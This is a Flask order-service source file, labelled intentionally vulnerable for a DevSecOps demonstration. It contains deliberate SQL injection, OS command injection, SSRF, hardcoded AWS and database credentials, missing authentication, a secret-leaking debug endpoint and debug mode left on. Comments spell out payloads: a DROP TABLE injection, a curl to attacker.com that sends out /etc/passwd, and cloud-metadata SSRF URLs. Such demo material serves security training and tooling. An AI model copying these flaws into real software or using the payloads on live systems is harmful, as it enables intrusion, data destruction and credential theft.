# =============================================================================
# order-service — INTENTIONALLY VULNERABLE
# Role: Order creation, listing, and webhook notifications
#
# Vulnerabilities present (for DevSecOps demo):
#   [VULN-01] SQL injection in POST /orders (string-formatted query)
#   [VULN-02] OS command injection via order notes field (os.system)
#   [VULN-03] Hardcoded AWS credentials (Access Key + Secret) in source code
#   [VULN-04] SSRF in POST /orders/notify — fetches arbitrary user-supplied URLs
#              Attacker payload: {"webhook_url": "http://169.254.169.254/latest/meta-data/"}
#   [VULN-05] No authentication — any caller can list or create orders for any user
#   [VULN-06] /debug/config endpoint exposes AWS keys and DB password
#   [VULN-07] Hardcoded DB credentials in source code
#   [VULN-08] Flask debug=True
# =============================================================================

import os
import subprocess
import urllib.request
from flask import Flask, request, jsonify
import psycopg2

app = Flask(__name__)

# [VULN-03] Hardcoded AWS credentials — these would trigger Gitleaks / truffleHog
AWS_ACCESS_KEY_ID     = 'AKIAIOSFODNN7EXAMPLE'
AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
AWS_REGION            = 'us-east-1'

# [VULN-07] Hardcoded DB password — same password reused across all services
DB_CONFIG = {
    'host':     os.environ.get('DB_HOST', 'postgres'),
    'database': 'shopdb',
    'user':     'admin',
    'password': 'admin123',
}


def get_db():
    return psycopg2.connect(**DB_CONFIG)


@app.route('/orders', methods=['POST'])
def create_order():
    data       = request.get_json()
    user_id    = data.get('user_id')
    product_id = data.get('product_id')
    quantity   = data.get('quantity')
    # [VULN-02] notes flows unsanitised into os.system — command injection
    notes      = data.get('notes', '')

    conn = get_db()
    cur  = conn.cursor()

    # [VULN-01] SQL injection — all fields interpolated directly
    # Payload for notes: "gift wrap'; DROP TABLE orders; --"
    query = (
        f"INSERT INTO orders (user_id, product_id, quantity, notes, status) "
        f"VALUES ({user_id}, {product_id}, {quantity}, '{notes}', 'pending') "
        f"RETURNING id"
    )
    cur.execute(query)
    order_id = cur.fetchone()[0]
    conn.commit()
    conn.close()

    # [VULN-02] OS command injection via order notes
    # Payload: notes = "present; curl http://attacker.com/$(cat /etc/passwd)"
    os.system(f"echo 'New order {order_id}: {notes}' >> /tmp/orders.log")

    return jsonify({'order_id': order_id}), 201


@app.route('/orders', methods=['GET'])
def list_orders():
    # [VULN-05] No auth — dumps every order from every customer
    conn = get_db()
    cur  = conn.cursor()
    cur.execute("SELECT id, user_id, product_id, quantity, notes, status, created_at FROM orders")
    rows = cur.fetchall()
    conn.close()
    return jsonify([
        {
            'id': r[0], 'user_id': r[1], 'product_id': r[2],
            'quantity': r[3], 'notes': r[4], 'status': r[5],
            'created_at': str(r[6]),
        }
        for r in rows
    ])


@app.route('/orders/notify', methods=['POST'])
def notify_webhook():
    # [VULN-04] SSRF — user controls the URL, no allowlist
    # Attack: {"webhook_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
    # Attack: {"webhook_url": "http://postgres:5432"}  (internal port scan)
    data        = request.get_json()
    webhook_url = data.get('webhook_url', '')
    try:
        with urllib.request.urlopen(webhook_url, timeout=5) as resp:
            content = resp.read().decode('utf-8', errors='replace')
        return jsonify({'status': 'notified', 'response': content})
    except Exception as exc:
        return jsonify({'error': str(exc)}), 500


@app.route('/debug/config', methods=['GET'])
def debug_config():
    # [VULN-06] Unauthenticated endpoint — leaks AWS keys and DB password
    return jsonify({
        'aws_access_key_id':     AWS_ACCESS_KEY_ID,
        'aws_secret_access_key': AWS_SECRET_ACCESS_KEY,
        'aws_region':            AWS_REGION,
        'db_password':           DB_CONFIG['password'],
    })


if __name__ == '__main__':
    # [VULN-08] debug=True exposes interactive Werkzeug debugger over the network
    app.run(host='0.0.0.0', port=5001, debug=True)
